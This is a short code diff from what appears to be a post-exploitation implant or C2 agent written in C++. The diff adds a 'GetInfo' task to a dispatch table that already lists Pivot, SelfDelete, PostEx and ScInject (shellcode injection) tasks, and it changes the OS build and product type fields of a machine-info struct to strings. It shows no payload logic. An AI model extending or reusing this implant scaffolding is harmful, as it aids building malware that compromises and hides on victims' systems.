@@ -288,8 +288,8 @@ namespace Root {
             BYTE  OsArch;
             ULONG OsMjrV;
             ULONG OsMnrV;
-            ULONG ProductType;
-            ULONG OsBuild;
+            PCHAR ProductType;
+            PCHAR OsBuild;
         } Machine = {
             .DomName= "-"
         };
@@ -2088,6 +2088,10 @@ public:
         _In_ JOBS* Job
     ) -> ERROR_CODE;
 
+    auto GetInfo(
+        _In_ JOBS* Job
+    ) -> ERROR_CODE;
+
     typedef auto ( Task::*TASK_FUNC )( JOBS* ) -> ERROR_CODE;
 
     struct {
@@ -2106,7 +2110,8 @@ public:
         Mgmt[9].ID  = Enm::Task::Pivot,      Mgmt[9].Run  = &Task::Pivot,
         Mgmt[10].ID = Enm::Task::SelfDelete, Mgmt[10].Run = &Task::SelfDel,
         Mgmt[11].ID = Enm::Task::PostEx,     Mgmt[11].Run = &Task::PostEx,
-        Mgmt[12].ID = Enm::Task::ScInject,   Mgmt[12].Run = &Task::ScInject
+        Mgmt[12].ID = Enm::Task::ScInject,   Mgmt[12].Run = &Task::ScInject,
+        Mgmt[13].ID = Enm::Task::GetInfo,    Mgmt[13].Run = &Task::GetInfo
     };
 };
 
